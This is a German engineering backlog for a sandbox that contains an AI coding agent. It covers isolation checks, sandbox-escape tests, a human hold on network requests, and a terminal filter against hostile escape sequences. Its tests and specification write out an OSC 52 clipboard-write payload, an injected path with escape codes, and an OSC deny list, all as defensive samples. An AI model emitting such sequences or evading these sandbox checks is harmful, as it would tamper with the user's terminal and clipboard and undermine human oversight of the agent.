- [x] Eine Socket-Datei im Projektverzeichnis vor dem Start führt zu `SANDBOX_015` in CLI (Exit 3) und UI (`Status(failed)`, Diagnostic sichtbar, kein „trotzdem starten"). **Nachtrag 2026-09-12, gemessen und gelesen getrennt:** Die Daemon-Hälfte misst `a_second_socket_in_the_project_stops_the_start` (`daemon/crates/ipc/tests/sandbox_start.rs:390`, echter zweiter Socket, echtes `bwrap`, unter CI Pflicht), die Oberfläche `app/test/features/sandbox/isolation_panel_test.dart:144`. Die CLI-Hälfte ist gelesen, nicht gefahren: `enforce_isolation` (`daemon/bin/humanitl/src/cmd/sandbox.rs:330`) reicht den Befund über `Failure::with_exit(diagnostic, EXIT_CHECK)` weiter, und `exit_code` bildet `SANDBOX_015` auf `EXIT_CHECK` = 3 ab (`daemon/bin/humanitl/src/cmd/mod.rs:49` und `:112`). Kein Test fährt diesen Weg: In `daemon/bin/humanitl/tests/cli.rs` kommt `SANDBOX_015` nicht vor, der Unit-Test in `cmd/mod.rs:423` prüft `SANDBOX_014`. Fehlender Test: `a_second_socket_makes_sandbox_run_sandbox_015_and_exit_three` in `daemon/bin/humanitl/tests/cli.rs`, hinter `sandbox_required()`, bindet einen `UnixListener` im Arbeitsverzeichnis und erwartet Exit 3 und `[SANDBOX_015]` auf stderr.
- [x] Ring im Header ist bei laufender Sandbox komplett grün, bei gestoppter grau.
- [x] Vierte Zeile zeigt den konfigurierten Endpoint amber, ohne Endpoint den grauen Satz.
- [x] `limit=entries` oder `limit=depth` in der Evidenz erscheint als abgebrochener Suchlauf, nicht als glattes Grün.
- [x] ESC-1 und ESC-2 grün in CI. Gemessen am 2026-09-06 am Lauf `34034257162` über `92980c4`: Job `escape-tests` grün in 224 s. Der Lauf bricht bei jedem roten Fall ab, ein grüner Job heißt also alle Fälle grün; lokal im selben Stand 43 Fälle in ESC-1 und 25 in ESC-2, 0 rot.

### Stand (2026-09-04): Größe L, der Daemon misst schon, es fehlt die Leitung und die Oberfläche

Audit von 28 Agenten gegen den Code: 20 Widersprüche, 7 blockierend, oben im Text korrigiert. Die Prüfung sitzt im Shim und ist seit HUM-012/013 fertig; `BwrapBackend::isolation_check` faltet sie seit HUM-011; `humanitl sandbox check --json` liefert die drei grünen Objekte heute. Was fehlt, ist klein im Daemon (`Op::IsolationCheck` und `Inner::start` in `daemon/crates/ipc/src/sandbox.rs` liefern nur `Status` und `Diagnostic`, der Kommentar dort sagt es) und groß in Flutter (Domäne, Konvertierung, Panel, Ring, sechs ARB-Schlüssel, Goldens). Daher L statt M.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- Sie beschrieb einen Shim-Aufruf `--report-fd 3 --proxy-sock … --extra-bridge …`, den der Shim mit Exit 125 ablehnt (`parse_cli` kennt `--proxy-port`, `--rules`, `--help`), und JSON-Zeilen, die niemand schreibt; das Format ist `CHECK <name> <ok|fail> <evidence>` mit fünf Namen, nicht drei.
- Sie nannte `SANDBOX_010..013` als Check-Codes; das sind Starter-Fehler. Die Check-Codes sind `SANDBOX_013..016` (CONVENTIONS 4.11, `codes.rs`), und ihr eigener Schritt 7 sagte das schon.
- Sie behauptete „der Agent wird erst exec't, wenn alle drei bestanden sind" und „Exit 3 ohne exec". Der Shim meldet nur; erzwungen wird auf dem Host (`enforce_isolation`). Wer das im Shim will, ändert HUM-012 und CONVENTIONS 4.12, nicht ein UI-Issue.
- Der Test-Fixture `/tmp/.X11-unix` scheitert schon am Profil (`SANDBOX_006`), nie an Check 2; `SANDBOX_012` hätte Exit 1, nicht 3.
- `isolation.rs` (neu) und „Report-Pipe" existieren längst (`bwrap.rs:728`, `launcher.rs` `LaunchOnce.report`); die eine fehlende Datei, `ipc/src/sandbox.rs`, fehlte in der Pfadliste.
- `SandboxEvent::IsolationResult` gibt es nicht; die Proto trägt `CheckResult` als `SandboxEvent.check` (Feld 2), und der Dart-Client verwirft den Fall heute (`grpc_daemon_client.dart`, `check_2`).
- Weiter korrigiert: `NavIntent(4)` öffnete Audit (Index 4), Sandbox ist Index 3; ARB-Schlüssel camelCase; Satz 3 lautet nach `docs/SECURITY.md` Abschnitt 1 und BACKLOG.md 4.1 „opens no new door", nicht „refuses to open any new door"; `app.dart` hält keinen Header, der Ring steht in `header_bar.dart`; `configProvider` existiert nicht, der Endpoint steht in `SandboxStatus.llmEndpoint`; kein `socketpair`-Probe, kein socat, kein `/proc/net/unix`, kein `nftw`, keine Warteschleife, kein PID 1.

**Offen, hier nicht entschieden:**

- `docs/SECURITY.md` Abschnitt zu seccomp und CONVENTIONS 4.11 sagen „ESC-1 und HUM-041 Check 3 erwarten `socketpair` = ok". Der Shim probt `socketpair` nicht (`probe_families` in `main.rs`). Entweder kommt die Probe in `probe_families` dazu, oder beide Dokumente streichen den Halbsatz „HUM-041 Check 3" im selben Commit. Dieses Issue nimmt die Probe nicht auf, weil es am Shim nichts ändert.
- Die Rolle des vierten Zustands „läuft" (Amber pulsierend): `Inner::start` sendet heute `starting` und `running` ohne Zwischenzustand; die drei Check-Ereignisse dazwischen sind der Zustand.

**Seit dem Audit überholt:** HUM-040 ist gemerged (`7fcafd0`). `app/lib/features/sandbox/` ist kein Platzhalter mehr; der Reiter `SandboxTab.isolation` zeigt `ComingPane` mit `sandboxIsolationPlaceholder` (`sandbox_screen.dart`), `sandboxStatusProvider`, `SandboxStatus.llmEndpoint`, `argvPreview` und `diagnostics` stehen. CONVENTIONS 4.17 (Sandbox-Bildschirm) nennt Isolations-Reiter und Terminal ausdrücklich als erklärte Platzhalter.

**Aus dem Audit nicht bestätigt oder verschoben:** Zeilenanker in `ipc/src/sandbox.rs` (Dispatch heute um Zeile 310, nicht 151) und `sandbox.dart`; die Aussage, `daemon/crates/sandbox/src/handle.rs` dokumentiere in Zeile 394 die Signalzustellung an das Namespace-Init, konnte über die Suchbegriffe nicht bestätigt werden (die Stelle `kill_process_group(pid, Signal::INT)` in `interrupt` existiert).

**Feindliche Eingabe:** `evidence` ist die eine Stelle. Der Suchlauf listet Socket-Dateinamen aus `/work`, und der Name landet als Text neben einem roten Punkt genau dort, wo ein Mensch entscheidet, ob er der Sandbox glaubt. `report::sanitize` macht Whitespace zu `_` (eine zweite `CHECK`-Zeile ist damit nicht fälschbar; Test dafür beibehalten), lässt aber U+202E, U+200B, U+FEFF durch. Die Säuberung in `convert.rs` und die Längendeckelung sind deshalb Teil des Daemon-Schritts, nicht Kür. Zweite Grenze: `parse_check_line` liefert bei einer unlesbaren Zeile `None`, und `check_from` wertet eine fehlende Zeile als `passed: false`; diese Richtung darf niemand in „unbekannt heißt gut" lockern.

### Fallstricke
- Reihenfolge im Shim ist sicherheitsrelevant und steht fest: Brücke binden, Checks 1 und 2, seccomp, Kind mit Check 3, `exec`. Check 3 muss **nach** dem Filter laufen (er beweist den Filter), Check 2 **davor**.
- Der Suchlauf über `/work` ist mit Budget (Tiefe 3, 2000 Einträge). Auf einem großen Projekt meldet er `limit=entries`; das ist kein Fehler, aber auch kein Beweis, und das Panel sagt es.
- `HUMANITL_REPORT_FD` darf nicht das Terminal-PTY sein; der Shim schließt vor `exec` alle geerbten Deskriptoren außer dem Bericht (`close_inherited`).
- `Diagnostic` reist als `SandboxEvent.diagnostic`, nicht als Text. Ein `CheckResult.diagnostic` ohne `why` gibt es nicht (`DiagnosticBuilder`).
- Wenn bwrap ohne User-Namespaces läuft (setuid-Variante), stimmt alles trotzdem; wenn `bwrap` fehlt, greift `SANDBOX_001` aus HUM-011.

### Referenzen
BACKLOG.md 4.1, 4.5 (ESC-1, ESC-2), Abschnitt 5 (Signature-Element Isolation Ring, Usability §4); CONVENTIONS.md 3.4, 3.11, 4.11, 4.12, 4.13, 4.17; `docs/SECURITY.md` Abschnitt 1. `seccomp(2)`, `proc(5)`.

---

## HUM-042 · Terminal
Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-011, HUM-012, HUM-018, HUM-040 · Blockiert: HUM-067, HUM-046

### Kontext
Der Nutzer arbeitet mit dem Agenten im Terminal. Das PTY muss im Daemon leben, weil dort bwrap läuft und weil die UI im Flatpak später keinen Zugriff auf den Host hat (ADR-003). Sicherheitsreview: Terminal-Ausgabe ist ein Seitenkanal (OSC 52 schreibt ins Host-Clipboard, OSC 8 baut anklickbare Links, Titel-Sequenzen fälschen Fenster). Der Daemon filtert den Bytestrom für jeden Client; das Widget registriert zusätzlich keinen OSC-Handler. Beides zusammen ist die Minderung von K-09; `docs/THREAT-MODEL.md` und BACKLOG.md 4.2 nennen heute nur das Widget und werden im selben Commit nachgezogen.

### Ziel
Der Daemon startet die Sandbox für jede Session an einem PTY, und der bestehende gRPC-Bidi-Stream `Terminal` liefert dessen Ausgabe. Die Flutter-App rendert den Stream mit `xterm2`, sendet Tastatureingaben und Resize. Der Daemon filtert die Ausgabe byteweise gegen eine Liste verbotener Escape-Sequenzen. Wenn ein Flow gehalten wird, zeigt die Oberfläche das auch vom Terminal aus.

### Nicht-Ziel
Kein zweiter schreibender Client: genau ein Schreiber, beliebig viele Leser (`TerminalInput.Open.read_only`), Geometrie des Schreibers, Leser rendern letterboxed (CONVENTIONS 4.10; das ersetzt „nur ein Client pro Session"). Kein lokales PTY in Flutter (`flutter_pty` wird nicht verwendet). Keine Scrollback-Persistenz über Neustart hinaus. **Bis zum 2026-09-07 stand hier „keine Proto-Änderung: der Vertrag ist committet und reicht."** Das galt, bis ein Mensch die Oberfläche benutzt hat: Die Hinweiszeile im Bytestrom stand quer über dem Bild des Vollbild-TUI, und ein Client kann sie nicht wegfiltern, ohne dem Agenten dasselbe zu erlauben. Seitdem trägt der Vertrag ein Feld mehr (`TerminalOutput.notice`, Minor `1.7`), additiv und ohne Bruch.

### Betroffene Pfade
- `daemon/crates/sandbox/src/launcher.rs`: `StdioMode::Pty { cols, rows }` neben `Inherit` und `Capture`
- `daemon/crates/sandbox/src/bwrap.rs`: `supervise` öffnet das PTY über `rustix::pty`, gibt den Slave als `Stdio::from(OwnedFd)` an bwrap und reicht den Master über den `SandboxHandle` heraus
- `daemon/crates/sandbox/src/handle.rs`: Master-Deskriptor, `resize(cols, rows)`
- `daemon/crates/sandbox/Cargo.toml`: `rustix`-Features `pty` und `termios` zusätzlich zu `fs`, `process` (die Versionszeile liegt noch in der Crate, nicht in `[workspace.dependencies]`; `daemon/Cargo.toml` fasst nur der Elternagent an)
- `daemon/crates/sandbox/src/osc_filter.rs` (neu): Byte-Filter
- `daemon/crates/ipc/src/terminal.rs` (neu): Bidi-Handler; `daemon/crates/ipc/src/server.rs` ersetzt `Err(unimplemented("Terminal", "HUM-042"))`; `daemon/crates/ipc/src/sandbox.rs` bekommt einen öffentlichen Zugang zum PTY der laufenden Sandbox (`running_handle` ist privat)
- `daemon/crates/config/src/model.rs`: `ui.terminal_notices` auf `UiConfig` (`deny_unknown_fields`; ohne das Feld ist der Schlüssel `CONFIG_002`), `docs/CONFIG.md` neu erzeugt mit `UPDATE_CONFIG_DOCS=1 cargo test -p humanitl-config --test config_docs`
- `daemon/bin/humanitl/src/cli.rs`, `cmd/sandbox.rs`: `humanitl sandbox attach [--read-only]` (ADR-018, ARCHITECTURE 3b: ein neuer RPC-Handler bringt sein Subkommando mit)
- `app/pubspec.yaml`, `app/pubspec.lock`: `xterm2` (heute in keinem Manifest)
- `app/lib/core/ipc/daemon_client.dart`, `grpc_daemon_client.dart`, `fake_daemon_client.dart`: erste Client-Streaming-Methode `terminal(Stream<TerminalInput>)` (der Dart-Stub in `humanitl.pbgrpc.dart` ist generiert)
- `app/lib/features/sandbox/widgets/terminal_pane.dart` (neu), `providers/terminal_provider.dart` (neu)
- `app/packages/ui`: `HContextMenu` (fehlt; ADR-0009 beziffert es mit 1 d und nennt HUM-030 als zweiten Nutzer) und eine 16-Farben-Terminalpalette auf `HTokens` (heute kein `terminalTheme`)
- `app/l10n/app_en.arb`, `app_de.arb`: `sandboxTerminalUntrustedBanner`; `sandboxTerminalPlaceholder` entfällt
- `docs/THREAT-MODEL.md` K-09, BACKLOG.md 4.2: Minderung als Daemon-Filter plus Widget
- `tests/escape/esc-5-filesystem.sh`: die zwei OSC-Fälle sind heute `skip` mit Zuschreibung HUM-050 (Kopf und Zeilen 19–20); gehört HUM-042. HUM-043 bearbeitet dieselbe Datei, Reihenfolge absprechen.
- `daemon/crates/sandbox/tests/osc_filter.rs`; der PTY-Test läuft über `BwrapBackend::plan`, weil `LaunchPlan` außerhalb der Crate nicht baubar ist (`program`, `once` sind `pub(crate)`)

Gestrichen: `daemon/crates/sandbox/src/pty.rs` mit `nix::pty::openpty` (`nix` steht in keinem Manifest; die Crate hat `#![forbid(unsafe_code)]`, und `fork`/`dup2`/`TIOCSCTTY` brauchen `unsafe`), die Proto-Zeile (`Notice`, `detach`, `Exit.signal` gibt es nicht, siehe Spezifikation).

### Spezifikation

**Der Vertrag war committet** (`proto/humanitl/v1/humanitl.proto`, gepinnt durch `proto/descriptor.binpb`, `proto/generated.sha256`, `daemon/crates/ipc/tests/proto_contract.rs`) und ist bis auf das eine Feld `TerminalOutput.notice` (2026-09-07, Minor `1.7`, Begründung im Nicht-Ziel oben) unangetastet geblieben:

```
TerminalInput  { oneof { Open open = 1; bytes data = 2; Resize resize = 3; google.protobuf.Empty close = 4 } }
TerminalInput.Open { string sandbox_id; uint32 cols; uint32 rows; bool read_only }
TerminalOutput { oneof { bytes data = 1; Exit exit = 2; Diagnostic diagnostic = 3; Resize resize = 4 } }
TerminalOutput.Exit { int32 code }
```

Kein `detach`, kein `Exit.signal`. Hinweise reisten anfangs als `data` und seit dem 2026-09-07 als `notice`, `TERM_001` als `diagnostic`, das Ende des Streams ohne Schließen des PTY als `close`. `daemon/crates/ipc/src/fake/mod.rs` (`echo_terminal`) implementiert diese Form schon und ist die Referenz.

PTY ist ein Modus des einen Launchers, kein zweiter:

```rust
pub enum StdioMode { Inherit, Capture, Pty { cols: u16, rows: u16 } }
// SandboxHandle: pub fn pty_master(&self) -> Option<&OwnedFd>; pub fn resize(&self, cols: u16, rows: u16) -> Result<(), Diagnostic>
```

`supervise` (`bwrap.rs`) öffnet das PTY mit `rustix::pty::openpt`/`grantpt`/`unlockpt`, hängt den Slave als stdin/stdout/stderr an das `Command` (`Stdio::from(OwnedFd)`, kein `unsafe`), schließt seine eigene Kopie des Slaves sofort nach dem Spawn (sonst sieht der Master nie EOF) und behandelt `EIO` auf dem Master als EOF. `setsid` macht bwrap selbst (`--new-session`, in jeder Kommandozeile, nicht abschaltbar). Die Startdiagnostik bleibt erhalten: `Shared::verdict` (`handle.rs`) erkennt `SANDBOX_003` aus dem aufgefangenen stderr; mit PTY muss das erste 2 KiB der Master-Ausgabe in `append_stderr` gespiegelt werden, sonst verlieren `is_userns_failure` und der `SANDBOX_012`-Auszug ihre Quelle.

`resize` ist `rustix::termios::tcsetwinsize` auf dem Master, gefolgt von `kill_process_group(child_pid, Signal::WINCH)` (das Muster steht in `SandboxHandle::interrupt`). Grund: Die Sandbox läuft mit `--new-session`, hat also kein steuerndes Terminal (`docs/THREAT-MODEL.md`, Absatz zu `TIOCSTI`), `TIOCSWINSZ` erzeugt deshalb kein `SIGWINCH`, und ein Signal an die bwrap-PID allein wäre eines an das Init des PID-Namensraums. Folge für Ctrl+C: er erreicht den Agenten nur als Byte 0x03 im Raw-Modus, nie als tty-erzeugtes `SIGINT`. `humanitl-sandbox` bleibt ohne `tokio`; `crates/ipc` legt `tokio::io::unix::AsyncFd` um den Master.

Bidi-Handler (`daemon/crates/ipc/src/terminal.rs`): Schlüssel ist `Open.sandbox_id`. Ein Schreiber, beliebig viele Leser. Ein zweites `Open { read_only: false }` bekommt `TerminalOutput.diagnostic` mit `TERM_001` („Zweiter schreibender Terminal-Client abgelehnt", `codes.rs`) und der Stream endet; Leser werden immer angenommen. Geometrie kommt mit `Open` (das ist per Bau die erste Nachricht; ein vorangestelltes `Resize` ist nicht das Protokoll) und wird angewendet, bevor der Ringpuffer (64 KiB **gefilterter** Bytes) wiederholt wird; danach live. `data` und `Resize` eines Lesers werden verworfen. Schreiber-Resizes sind auf eines je 50 ms gedrosselt, das letzte gewinnt, und jeder Leser erhält die neue Geometrie als `TerminalOutput.Resize`. `close` beendet den Stream, ohne das PTY zu schließen. Session-Ende ⇒ `Exit { code }` und Stream-Ende. Ohne laufende Sandbox antwortet `terminal` wie `sandbox()` mit `IPC_006`.

OSC-Filter (`osc_filter.rs`), zustandsbehafteter Byte-Filter, der über beliebige Chunk-Grenzen funktioniert:

```rust
pub struct OscFilter { state: State, buf: Vec<u8> }
impl OscFilter {
    pub fn new(policy: OscPolicy) -> Self;
    /// Feeds bytes, returns the bytes to forward. Never reorders. Blocks only complete forbidden sequences.
    pub fn feed(&mut self, input: &[u8]) -> Vec<u8>;
    /// True between sequences; the notice injector needs it.
    pub fn at_boundary(&self) -> bool;
}
pub struct OscPolicy { pub deny: Vec<u16> }   // OSC numbers; default [0, 1, 2, 7, 8, 9, 52, 777, 1337]
```

Grammatik: `ESC ] <num> ; <payload> (BEL | ESC \)`. Der Filter erkennt `ESC ]`, sammelt bis zum Terminator (max. 64 KiB, danach verwerfen), prüft `<num>` gegen `deny`. Verbotene Sequenz wird komplett entfernt; erlaubte (z. B. OSC 4/10/11 Farben, OSC 133 Prompt-Marker) werden unverändert durchgereicht. Zusätzlich entfernt: `ESC c` (RIS), DCS (`ESC P … ESC \`), und — in der ersten Fassung vergessen — APC (`ESC _`), PM (`ESC ^`), SOS (`ESC X`), weil kitty-Grafik und das iTerm2-Dateiprotokoll über APC reisen. CSI/SGR bleiben unangetastet. Der Filter ist die einzige Stelle, die Terminalbytes verändert; der Ringpuffer hält nur gefilterte Bytes, sonst spielte ein Re-Attach den Rohstrom ab.

Hinweis bei gehaltenem Flow: kein neuer Kanal und keine Richtung Proxy → Terminal (ARCHITECTURE 1.2: „Niemand fragt den Proxy nach seinem Zustand, alle hören zu"). Der Handler abonniert `HoldQueue::subscribe()` (`daemon/crates/proxy/src/hold.rs`) und löst Methode, Host und Pfad über `FlowRegistry::get(flow_id)` auf, denn `FlowEvent::Held` trägt nur `flow_id`, `at`, `deadline`, `queue_bytes`, `queue_count`. Die Zeile `[humanitl] request held: {method} {host}{path_truncated} · waiting for you` (dann `allowed` / `blocked` / `timed out`) läuft **als Ganzes** durch `humanitl_core::block::sanitize_note` und der Pfad wird hart gekürzt, bevor ein Byte in den Strom geht — `HttpRequest.path_and_query` ist roher Text von der Leitung, nur der Host ist über `HostName::parse` schon ASCII. Eingefügt wird nur, wenn `at_boundary()` gilt, damit der Hinweis nie in eine halb geschriebene Escape-Sequenz des Agenten fällt. Konfigurierbar über `ui.terminal_notices` (Default `true`, Tier `advanced`).

Sichtbarkeit: OpenCode ist ein Vollbild-TUI (`OpenCodeAdapter::is_fullscreen_tui()` = `true`), das mit absoluter Adressierung neu zeichnet; eine `\r\n…\r\n`-Zeile im selben Bytestrom landet, wo der Cursor gerade steht, und ist mit dem nächsten Frame weg. Der Hinweis wird deshalb **zusätzlich außerhalb des Emulators** gezeigt: ein Streifen in `TerminalPane` aus demselben Ereignis (`HRow`, wie `sandboxLogProvider` es schon kann). Das Akzeptanzkriterium hängt am Streifen, nicht an der Zeile im Strom.

Flutter `TerminalPane`:

```dart
class TerminalPane extends ConsumerStatefulWidget { ... }
// build: TerminalView(terminal, controller: ..., autoResize: true, theme: <Palette aus HTokens>, textStyle: HType.monoFamily 13)
// Öffnen: Geometrie messen, dann Open{sandbox_id, cols, rows, read_only: false}; danach data / Resize
// terminal.onOutput -> ref.read(terminalProvider(sandboxId).notifier).sendInput(bytes)
// terminal.onResize -> sendResize(cols, rows)
// stream.listen: data -> terminal.write(utf8.decode(data, allowMalformed: true)); diagnostic -> Karte; exit -> Banner
```

Banner über dem Terminal (HRow, 24 px, `bg-2`, `fg-1`): ARB `sandboxTerminalUntrustedBanner` en "Agent output is untrusted. Clipboard and link sequences are filtered." / de "Agent-Ausgabe ist nicht vertrauenswürdig. Zwischenablage- und Link-Sequenzen werden gefiltert." xterm2-Terminal-Optionen: `Terminal(maxLines: 10000)`, OSC-Handler nicht registrieren (kein `onTitleChange`-Effekt). Rechtsklick-Menü mit Copy/Paste über `HContextMenu` aus `app/packages/ui` (Copy aus Selektion ist erlaubt, das ist eine Nutzeraktion); wer das Menü aus diesem Issue nimmt, schreibt das hier hin.

### Schritte
1. Spezifikation ist bereinigt (siehe Stand). Vorher mit dem Projekteigentümer die `--new-session`-Frage festhalten: Flag bleibt (Empfehlung; sonst ADR plus `docs/SECURITY.md` und `docs/THREAT-MODEL.md` im selben Commit, weil `TIOCSTI` wieder offen wäre), `SIGWINCH` liefert der Daemon selbst.
2. `rustix`-Features `pty`, `termios` in `daemon/crates/sandbox/Cargo.toml`; `StdioMode::Pty`, Slave an `supervise`, Master und `resize` am `SandboxHandle`, stderr-Spiegel für `Shared::verdict`. Test über `BwrapBackend::plan` mit `tput cols` in der Sandbox (bwrap 0.12.0 ist installiert, `MIN_BWRAP_VERSION` 0.8.0).
3. `osc_filter.rs` als reiner Zustandsautomat mit Tabellen-Tests, ohne IO.
4. `ipc/src/terminal.rs`: Broadcast gefilterter Chunks, Ringpuffer, Schreiber-Slot, Lesermenge, Drossel, `TERM_001`; Hinweiszeile aus `HoldQueue::subscribe()` + `FlowRegistry::get`, durch `sanitize_note`, nur an Grenzen.
5. `ui.terminal_notices` in `UiConfig`, `docs/CONFIG.md` neu erzeugen.
6. `IpcServer::terminal` verdrahten, Zugang in `SandboxService`, `IPC_006` ohne Sandbox; `humanitl sandbox attach [--read-only]`.
7. Flutter: `xterm2`, Bidi-Methode in `DaemonClient`/`GrpcDaemonClient`/`FakeDaemonClient` (geteilte Datei: neu lesen, anhängen), Provider, Pane, Banner, Hinweis-Streifen, Palette auf `HTokens`, `HContextMenu`, Fokus-Handling (Terminal bekommt Fokus beim Betreten des Screens, gibt ihn bei `Ctrl+1..5` ab).
8. `esc-5-filesystem.sh`: Zuschreibung HUM-050 → HUM-042 in Kopf und beiden Zeilen, `osc52_does_not_reach_host` und `osc8_and_title_are_inert` echt; `docs/THREAT-MODEL.md` K-09 und BACKLOG.md 4.2 nachziehen.
9. Integrationstest mit echtem Daemon: Eingabe `echo $TERM\n`, Ausgabe enthält `xterm-256color`.

### Tests
- `osc52_removed_across_chunks`: Sequenz `ESC ] 52 ; c ; base64 BEL` in zwei Chunks geteilt ⇒ Ausgabe enthält sie nicht, umliegender Text unverändert.
- `osc8_removed`, `osc0_title_removed`, `osc133_passes`, `sgr_passes`, `ris_removed`, `dcs_removed`, `apc_removed`, `pm_removed`, `sos_removed`.
- `unterminated_osc_dropped_after_cap`: 70 KiB ohne Terminator ⇒ verworfen, Filter erholt sich.
- `pty_resize_reaches_child`: `resize(120, 40)` ⇒ `tput cols` in der Sandbox liefert `120`.
- `second_writer_rejected`: zweites `Open{read_only:false}` ⇒ `TERM_001` als `diagnostic`. `second_reader_accepted`, `reader_cannot_write`, `reader_resize_ignored`.
- `scrollback_replayed_on_attach`: 1000 Zeilen Ausgabe, Attach ⇒ Client erhält die letzten 64 KiB, gefiltert.
- `notice_is_sanitized`: Pfad mit `\r`, `\x1b[2K` und `\x1b]52;c;…\x07` ⇒ genau eine `[humanitl]`-Zeile, kein `ESC ]` im Strom.
- Widget: Banner sichtbar; Eingabe `a` sendet `[0x61]`; Hinweis-Streifen erscheint bei `Held`.

### Akzeptanzkriterien
- [x] OpenCode-TUI ist im Flutter-Terminal bedienbar (Pfeiltasten, Enter, Ctrl+C als Byte 0x03), Farben stimmen. **Beide Hälften sind seit dem 2026-09-07 belegt: die Tasten gemessen, das Bild gesehen.** Ein Mensch hat am Bildschirm gemeldet, dass er in OpenCode nichts löschen kann und `Ctrl+P` nicht ankommt; die Ursache lag in `TerminalPane._onKey`, das `KeyEventResult.skipRemainingHandlers` zurückgab. `TerminalView` nimmt jede Antwort außer `ignored` als Übersteuerung und übersetzt die Taste dann nicht mehr in Bytes -- Buchstaben liefen über die Texteingabe und kamen an, alles andere fiel weg. Neu gemessen in `app/test/features/sandbox/terminal_pane_test.dart`: `every_key_that_is_not_a_letter_reaches_the_agent` schickt Rücktaste (`0x7f`), Enter (`0x0d`), Pfeil hoch (`ESC [ A`), `Ctrl+C` (`0x03`) und `Ctrl+P` (`0x10`) durch den echten Emulator und liest die Bytes, die der Client hinaufschickt (`SandboxTestClient.typed` in `harness.dart`); `a_shortcut_of_the_application_survives_the_terminal` ist die Gegenprobe für `Ctrl+1`, `Ctrl+6` und `Ctrl+K`: Alle drei erreichen die Anwendung und keines den Agenten. Die letzten beiden brauchen mehr als ein `ignored`, und das ist der Befund von Antigravity aus dem Review dieses Standes: Der Emulator übersetzt `Ctrl+K` in `0x0b` und `Ctrl+6` in `0x1e` (`xterm2` `CtrlInputHandler`) und meldet sie als behandelt, womit sie kein `Shortcuts` darüber mehr erreichen -- vor dem 2026-09-07 also auch nicht. `_onKey` schlägt eine Taste deshalb selbst in `shellShortcuts()` nach und löst die Absicht über `Actions` aus; `docs/UX.md` 5.2 hält die Regel fest. Mutationsproben: `_onKey` auf `KeyEventResult.handled`, der Tastentest rot; `_onKey` auf ein nacktes `KeyEventResult.ignored`, die Gegenprobe rot. Was nur ein Auge sieht, hat der Nutzer am selben Tag gesehen: Er hat die Sitzung aus der Oberfläche heraus gestartet (Knopf oben rechts), im laufenden OpenCode getippt, gelöscht und `Ctrl+P` benutzt -- „ich kann in open code tippen strg p machen und auch löschen das geht jetzt alles sauber" -- und zu den Farben: „ja die farben in der tui stimmen soweit". Damit ist beides belegt: der Weg der Tasten durch den Emulator als Test, das Bild durch einen Menschen vor dem Bildschirm.
- [x] `printf '\e]52;c;SGVsbG8=\a'` in der Sandbox ändert das Host-Clipboard nicht (ESC-5, `osc52_does_not_reach_host` und `osc8_and_title_are_inert`). Gemessen am 2026-09-06: beide Fälle `pass` im Escape-Lauf dieses Standes, und der Job `escape-tests` desselben Laufs (`34034257162`) ist grün.
- [x] Gehaltener Flow erzeugt den Hinweis im Streifen über dem Terminal und, wenn `ui.terminal_notices` gilt, die gesäuberte Zeile als eigenen Rahmen (`TerminalOutput.notice`, Proto `1.7`) neben den Bytes. Drei Messungen: `a_held_flow_shows_a_strip_above_the_terminal` und `the_strip_comes_from_the_event_stream` (`app/test/features/sandbox/terminal_pane_test.dart`) für den Streifen, der aus dem Ereignisstrom kommt und nicht aus den Bytes; `notice_is_sanitized` (`ipc/src/terminal.rs`) für die Säuberung — kein Escape, keine Nutzlast, genau ein Absender; und neu am 2026-09-06 `the_notice_switch_silences_the_stream` (`ipc/tests/terminal.rs`) für den Schalter: Mit `ui.terminal_notices = false` kommt die Zeile nicht, während der Agent im selben Strom weiter antwortet. Der Test wartet vor dem Hinweis auf eine Grenze des Filters, weil ein Hinweis mitten in einer Folge nach `pending` geht und erst mit dem nächsten `feed` hinausginge — die Abwesenheit wäre sonst auch mit eingeschaltetem Schalter wahr. Mutationsprobe: den Riegel `if !self.inner.notices { return; }` in `TerminalHub::notice` (`ipc/src/terminal.rs`) entfernen und den Schalter auf `false` lassen, Test rot. Die naheliegendere Probe, den Schalter auf `true` zu setzen, verteidigt nur die Verdrahtung der Konfiguration: Sie stirbt schon an `assert!(!hub.notices())`, also vor der Zusicherung über den Bytestrom. **Am 2026-09-07 umgebaut, weil der Bytestrom der falsche Ort war:** In der Oberfläche stand die Zeile quer über dem Bild des OpenCode-TUI („einfach über dem open code so drüber“, gemeldet vom Nutzer). Seitdem verschickt `TerminalHub::notice` einen `Frame::Notice`, der Ring bleibt frei davon, und jeder Client entscheidet selbst: `humanitl sandbox attach` schreibt die Zeile mit `humanitl_ipc::notice_line` zwischen die Bytes, `convert.dart` wirft sie weg, weil der Streifen sie schon zeigt. Drei neue Messungen: `a_notice_stands_beside_the_bytes_and_never_inside_them` (`ipc/tests/terminal.rs`) -- der Rahmen kommt an, und das Echo des Agenten danach trägt kein Byte davon; `sandbox_attach_speaks_the_terminal_rpc` (`daemon/bin/humanitl/tests/cli.rs`) -- die Kommandozeile schreibt die Zeile mit `\r\n` davor und danach auf stdout, gegen einen Fake, der nach `Open` einen Hinweis schickt; `a notice of the daemon never becomes a terminal frame` (`app/test/core/ipc/convert_test.dart`) -- die Oberfläche macht daraus kein Bild. Mutationsproben: `notice()` wieder über `emit(notice_line(..))` in den Strom legen, erster Test rot; den `Notice`-Zweig in `attach.rs` auf `{}` setzen, zweiter Test rot.
- [x] Fenster-Resize im UI ändert die Spaltenzahl im Agenten. Der Weg hat zwei Hälften, und beide sind am 2026-09-06 gemessen. Unten `a_resize_reaches_the_agent` (`ipc/tests/terminal.rs`) an einer echten Sandbox: Der Agent meldet auf jede Zeile `stty size`, also was **sein** Terminal über sich weiß — erst `SIZE 30 100` wie beim Öffnen, nach dem Resize `SIZE 43 132`; der Test wartet dabei auf die Bestätigung des Dienstes, weil der Wunsch über einen `watch`-Kanal und die Zeile über `spawn_blocking` an dasselbe Pseudoterminal gehen und sonst der Scheduler entschiede. Mutationsprobe: eine andere Zahl erwartet, Test rot. Oben `a_resize_of_the_window_goes_up_as_a_command` (`app/test/features/sandbox/terminal_pane_test.dart`): Was der Emulator über seine neue Größe meldet, geht als `TerminalResize` hinauf, und die Antwort des Daemons trägt 132 mal 43 in den Zustand. Mutationsprobe: `terminal.onResize` im Provider auf einen leeren Rumpf, Test rot. **Die dritte Aussage des Kriteriums, das Neuzeichnen ohne Zeilensalat, ist nicht gemessen:** Sie ist eine Aussage über das Bild des Flutter-Terminals und braucht ein Auge oder einen Vollbild-Agenten; sie bleibt bei der manuellen Prüfung darüber.
